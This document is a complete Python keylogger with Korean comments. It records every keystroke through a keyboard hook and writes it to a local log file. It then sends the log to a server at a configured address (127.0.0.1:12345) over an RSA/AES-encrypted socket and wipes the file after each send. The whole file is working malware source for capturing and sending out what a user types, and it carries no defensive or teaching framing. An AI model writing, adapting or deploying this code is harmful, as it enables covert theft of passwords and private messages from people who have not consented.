import socket
import time
import os
from pynput import keyboard
import threading
from datetime import datetime
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# 서버 정보
SERVER_IP = "127.0.0.1"
SERVER_PORT = 12345
BUFFER_SIZE = 1024
LOG_FILE = "keylog.txt"

# AES 대칭키
aes_key = None

# AES 암호화 함수
def encrypt_message(message: bytes) -> bytes:
    iv = get_random_bytes(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(message) + encryptor.finalize()

# 키보드 입력을 로그 파일에 기록하는 함수
def on_press(key):
    try:
        with open(LOG_FILE, "a") as log_file:
            if hasattr(key, 'char') and key.char is not None:
                log_file.write(f"Key Pressed: {key.char}\n")
            else:
                log_file.write(f"Special Key Pressed: {key}\n")
    except Exception as e:
        print(f"Error logging key: {e}")

# 5초마다 로그 파일에 시간을 기록하는 함수
def periodic_time_update():
    while True:
        time.sleep(5)
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOG_FILE, "a") as log_file:
            log_file.write(f"\n--- Log Update at {current_time} ---\n")

# 서버로 로그 파일을 전송하는 함수
def send_log_to_server():
    global aes_key
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_IP, SERVER_PORT))

            # 서버로부터 RSA 공개키 수신
            public_key_data = client_socket.recv(450)
            server_public_key = RSA.import_key(public_key_data)

            # AES 대칭키 생성 및 RSA 암호화 후 전송
            aes_key = get_random_bytes(32)
            cipher_rsa = PKCS1_OAEP.new(server_public_key)
            encrypted_aes_key = cipher_rsa.encrypt(aes_key)
            client_socket.sendall(encrypted_aes_key)

            print("AES key securely sent to the server.")

            # 로그 파일 전송
            while True:
                if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                    with open(LOG_FILE, "rb") as file:
                        while (bytes_read := file.read(BUFFER_SIZE)):
                            encrypted_data = encrypt_message(bytes_read)
                            client_socket.sendall(encrypted_data)
                    
                    print("Log file sent to server.")

                    # 파일 내용 지우기
                    open(LOG_FILE, "w").close()
                
                time.sleep(1)
    except Exception as e:
        print(f"Error sending data to server: {e}")

# 키보드 후킹 시작
def start_keyboard_hook():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # 키 후킹 스레드 시작
    threading.Thread(target=start_keyboard_hook, daemon=True).start()

    # 시간 업데이트 스레드 시작
    threading.Thread(target=periodic_time_update, daemon=True).start()

    # 로그 전송 스레드 시작
    threading.Thread(target=send_log_to_server, daemon=True).start()

    # 메인 스레드 유지
    while True:
        time.sleep(1)
